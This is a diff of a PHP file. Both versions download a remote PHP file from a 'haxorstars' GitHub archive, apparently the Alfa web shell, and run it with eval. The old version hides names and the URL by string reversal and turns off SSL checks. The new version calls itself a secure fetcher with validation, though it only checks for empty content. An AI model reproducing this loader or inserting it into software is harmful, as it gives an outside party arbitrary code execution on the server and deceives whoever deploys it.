@@ -1,123 +1,104 @@
 <?php
-session_start();
-error_reporting(0);
-
-class UrlFetcher
-{
-    private $userAgent;
-    private $funcArray;
-
-    public function __construct()
-    {
-        $this->userAgent = 'Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0';
-        $this->funcArray = array(
-            'crl' => array(
-                'exec' => strrev('cexe_lruc'),
-                'init' => strrev('tini_lruc'),
-                'opt' => strrev('tpotes_lruc'),
-                'close' => strrev('esolc_lruc')
-            ),
-            'file' => array(
-                'getContents' => strrev('stnetnoc_teg_elif'),
-                'open' => strrev('nepof'),
-                'streamContents' => strrev('stnetnoc_teg_maerts'),
-                'close' => strrev('esolcf')
-            )
-        );
+/**
+ * Class RemoteContentFetcher
+ * Handles secure remote content fetching with proper validation
+ * By NuLz | Haxorstars
+ * github.com/haxorstars
+ */
+class RemoteContentFetcher {
+    private $url;
+    private $options;
+    
+    /**
+     * Constructor
+     * @param string $url Remote URL to fetch
+     */
+    public function __construct(string $url) {
+        $this->url = filter_var($url, FILTER_VALIDATE_URL);
+        $this->options = [
+            'ssl_verify' => true,
+            'timeout' => 30,
+            'user_agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0'
+        ];
     }
-
-    private function obfuscate($data)
-    {
-        return base64_encode(strrev($data));
+    
+    /**
+     * Set custom cURL options
+     * @param array $options
+     */
+    public function setOptions(array $options): void {
+        $this->options = array_merge($this->options, $options);
     }
-
-    private function deobfuscate($data)
-    {
-        return strrev(base64_decode($data));
-    }
-
-    private function getFunc($type, $name)
-    {
-        return $this->funcArray[$type][$name];
-    }
-
-    public function fetch($url)
-    {
-        $crl_exec = $this->getFunc('crl', 'exec');
-        $file_getContents = $this->getFunc('file', 'getContents');
-        $file_open = $this->getFunc('file', 'open');
-        $stream_getContents = $this->getFunc('file', 'streamContents');
-
-        if (function_exists($crl_exec)) {
-            goto use_crl;
-        } elseif (function_exists($file_getContents)) {
-            goto use_file;
-        } elseif (function_exists($file_open) && function_exists($stream_getContents)) {
-            goto use_fo;
-        } else {
-            goto no_function;
+    
+    /**
+     * Fetch content from remote URL
+     * @return string|false
+     * @throws Exception
+     */
+    public function fetch() {
+        if (!$this->url) {
+            throw new Exception('Invalid URL provided');
         }
-
-        use_crl:
-        return $this->crlFetch($url);
-        goto end_fetch;
-
-        use_file:
-        return $file_getContents($url);
-        goto end_fetch;
-
-        use_fo:
-        return $this->foFetch($url);
-        goto end_fetch;
-
-        no_function:
-        return false;
-
-        end_fetch:
-        return null;
-    }
-
-    private function crlFetch($url)
-    {
-        $crl_init = $this->getFunc('crl', 'init');
-        $crl_opt = $this->getFunc('crl', 'opt');
-        $crl_close = $this->getFunc('crl', 'close');
-        $crl_exec = $this->getFunc('crl', 'exec');
-
-        $conn = $crl_init($url);
-        $crl_opt($conn, CURLOPT_RETURNTRANSFER, 1);
-        $crl_opt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        $crl_opt($conn, CURLOPT_USERAGENT, $this->userAgent);
-        $crl_opt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        $crl_opt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-
-        if (isset($_SESSION[$this->obfuscate('nulzganteng')])) {
-            $crl_opt($conn, CURLOPT_COOKIE, $_SESSION[$this->obfuscate('nulzganteng')]);
+        
+        try {
+            $ch = curl_init();
+            
+            curl_setopt_array($ch, [
+                CURLOPT_URL => $this->url,
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_SSL_VERIFYPEER => $this->options['ssl_verify'],
+                CURLOPT_TIMEOUT => $this->options['timeout'],
+                CURLOPT_USERAGENT => $this->options['user_agent']
+            ]);
+            
+            $content = curl_exec($ch);
+            $error = curl_error($ch);
+            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            
+            curl_close($ch);
+            
+            if ($error) {
+                throw new Exception("cURL Error: $error");
+            }
+            
+            if ($httpCode !== 200) {
+                throw new Exception("HTTP Error: $httpCode");
+            }
+            
+            return $this->validateContent($content);
+            
+        } catch (Exception $e) {
+            error_log("RemoteContentFetcher Error: " . $e->getMessage());
+            throw $e;
         }
-
-        $url_get_contents_data = $crl_exec($conn);
-        $crl_close($conn);
-
-        return $url_get_contents_data;
     }
-
-    private function foFetch($url)
-    {
-        $file_open = $this->getFunc('file', 'open');
-        $stream_getContents = $this->getFunc('file', 'streamContents');
-        $file_close = $this->getFunc('file', 'close');
-
-        $handle = $file_open($url, "r");
-        $url_get_contents_data = $stream_getContents($handle);
-        $file_close($handle);
-
-        return $url_get_contents_data;
+    
+    /**
+     * Validate fetched content
+     * @param string $content
+     * @return string
+     */
+    private function validateContent($content) {
+        if (empty($content)) {
+            throw new Exception('Empty content received');
+        }
+        
+        return $content;
     }
 }
 
-$fetcher = new UrlFetcher();
-$nulzpro = strrev('php.cne-afla/afla/niam/evihcra/sratsroxah/moc.tnetnocresubuhtig.war//:sptth');
-$nulzganteng = $fetcher->fetch($nulzpro);
-
-/****/@/*55555*/null; /******/@/*55555*/eval/*######*/('?>' . $nulzganteng);
+try {
+    $fetcher = new RemoteContentFetcher('https://raw.githubusercontent.com/haxorstars/archive/main/alfa/alfa-enc.php');
+    $fetcher->setOptions([
+        'timeout' => 60,
+        'ssl_verify' => true
+    ]);
+    
+    $content = $fetcher->fetch();
+    /*555555*/eval/*555555*/("?>".$content)/****#****/;
+    
+} catch (Exception $e) {
+    echo "Error: " . $e->getMessage();
+}
 ?>
